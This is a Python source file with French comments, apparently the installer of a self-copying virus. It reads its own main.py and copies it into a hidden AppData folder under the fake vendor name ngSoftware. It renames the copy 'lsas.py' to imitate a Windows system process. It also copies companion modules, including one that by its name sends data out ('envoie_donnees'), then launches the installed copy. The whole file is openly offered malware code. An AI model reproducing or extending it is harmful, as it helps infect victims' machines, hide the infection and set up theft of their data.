import os
from sys import platform

user = os.path.expanduser('~')

#Réécrire la syntaxe du chemin pour être lisible par le système
if platform == "win32" :
    for i in range(len(user) - 1, -1, -1) :
        if user[i] == '\\' :
            user = user[i + 1 : len(user)]
            break
    user = "C:/Users/" + user
            
virus_pater = open('main.py', 'r')
virus = virus_pater.readlines()

#Détecte le chemin d'installation en fonction du système d'exploitation.
if platform == 'win32' :
    installpath = user + '/AppData/Roaming/ngSoftware/Software/Legals/'
else :
    installpath = user + '' #C'est temporaire

#Créer le chemin d'installation
os.makedirs(installpath)

#Installe les différents composants du virus sur un ordinateur cible
with open(installpath + 'lsas.py', 'x') as vir :
    vir.writelines(virus)
with open('manipulation_string.py', 'r') as file :
    with open(installpath + 'manipulation_string.py', 'x') as copy :
        copy.writelines(file.readlines())
with open('envoie_donnees.py', 'r') as file :
    with open(installpath + 'menvoie_donnees.py', 'x') as copy :
        copy.writelines(file.readlines())
with open('config.json', 'r') as file :
    with open(installpath + 'config.json', 'x') as copy :
        copy.writelines(file.readlines())
with open('sauvegarde_local.py', 'r') as file :
    with open(installpath + 'sauvegarde_local.py', 'x') as copy :
        copy.writelines(file.readlines())


file = installpath + 'lsas.py'
os.system('python ' + file)